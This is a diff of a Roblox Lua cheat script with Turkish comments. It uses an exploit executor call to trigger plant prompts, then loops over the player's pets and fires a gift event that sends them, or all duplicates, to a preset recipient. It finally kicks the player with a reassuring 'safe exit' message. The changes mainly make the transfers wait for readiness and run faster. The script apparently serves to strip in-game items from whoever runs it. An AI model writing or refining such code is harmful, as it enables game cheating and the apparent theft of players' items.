@@ -1,7 +1,13 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
+
+-- Her şey hazır olmadan başlamasın
+repeat task.wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+repeat task.wait() until workspace:FindFirstChild("Plots")
+repeat task.wait() until player:GetAttribute("Plot") ~= nil
+
+local character = player.Character
 local hrp = character:WaitForChild("HumanoidRootPart")
 local backpack = player:WaitForChild("Backpack")
 
@@ -77,7 +83,7 @@ local function teleportAndTrigger(folder)
         if prompt then
             fireproximityprompt(prompt)
             print("✅ Tetiklendi:", folder.Name)
-            task.wait(1)
+            task.wait(0.5)
         else
             warn("❌ ProximityPrompt yok:", folder.Name)
         end
@@ -85,16 +91,16 @@ local function teleportAndTrigger(folder)
 end
 
 local function collectMyPlot()
-    local myPlotNumber = player:GetAttribute("Plot")
-    if not myPlotNumber then
-        warn("❌ Plot bulunamadı (Attribute yok)")
-        return
+    local myPlotNumber = nil
+    while not myPlotNumber do
+        myPlotNumber = player:GetAttribute("Plot")
+        task.wait(1)
     end
 
-    local plot = workspace:WaitForChild("Plots"):FindFirstChild(tostring(myPlotNumber))
-    if not plot then
-        warn("❌ Plot bulunamadı: " .. tostring(myPlotNumber))
-        return
+    local plot = nil
+    while not plot do
+        plot = workspace:WaitForChild("Plots"):FindFirstChild(tostring(myPlotNumber))
+        task.wait(1)
     end
 
     for check = 1, 3 do
@@ -106,6 +112,8 @@ local function collectMyPlot()
                     teleportAndTrigger(folder)
                 end
             end
+        else
+            warn("❌ Plants klasörü bulunamadı.")
         end
         task.wait(2)
     end
@@ -113,7 +121,7 @@ local function collectMyPlot()
 end
 
 ----------------------------------------------------------------------
--- Gift İşlemleri (Tamamen Gönderilecekler)
+-- Gift İşlemleri
 ----------------------------------------------------------------------
 
 local function getAllMatchingPets()
@@ -135,27 +143,20 @@ end
 local function sendAllMatchingPets()
     local pets = getAllMatchingPets()
     print("🎁 Gönderim başlatıldı. (" .. #pets .. " adet)")
-
     for _, pet in ipairs(pets) do
         if pet.Parent ~= character then pet.Parent = character task.wait(0.3) end
         giftEvent:FireServer({ Item = pet, ToGift = recipientUsername })
-
         local timeout = 5
         local start = tick()
         while pet.Parent ~= nil and tick() - start < timeout do task.wait(0.1) end
-
         if pet.Parent ~= nil then
             warn("⚠️ Gönderilemedi:", pet.Name)
         else
             print("✅ Gönderildi:", pet.Name)
         end
-        task.wait(0.5)
+        task.wait(0.3)
     end
 end
-
-----------------------------------------------------------------------
--- Gift İşlemleri (Fazlalıkları Gönder, 1 Sende Kalacak)
-----------------------------------------------------------------------
 
 local function getAllMatchingPets2()
     local pets = {}
@@ -196,17 +197,15 @@ local function sendAllMatchingPets2()
                 local pet = pets[i]
                 if pet.Parent ~= character then pet.Parent = character task.wait(0.3) end
                 giftEvent:FireServer({ Item = pet, ToGift = recipientUsername })
-
                 local timeout = 5
                 local start = tick()
                 while pet.Parent ~= nil and tick() - start < timeout do task.wait(0.1) end
-
                 if pet.Parent ~= nil then
                     warn("⚠️ Gönderilemedi:", pet.Name)
                 else
                     print("✅ Gönderildi:", pet.Name)
                 end
-                task.wait(0.5)
+                task.wait(0.3)
             end
         else
             print("✅ " .. baseName .. " sadece 1 tane, sende kaldı.")
@@ -222,8 +221,7 @@ local function main()
     collectMyPlot()
     sendAllMatchingPets()
     sendAllMatchingPets2()
-
-    print("🎉 Tüm işlemler başarıyla tamamlandı. 5 saniye içinde çıkılıyor...")
+    print("🎉 Tüm işlemler tamamlandı. 5 saniye içinde çıkılıyor...")
     task.wait(5)
     player:Kick("✅ İşlemler tamamlandı! Güvenli şekilde çıkış yapılıyor.")
 end
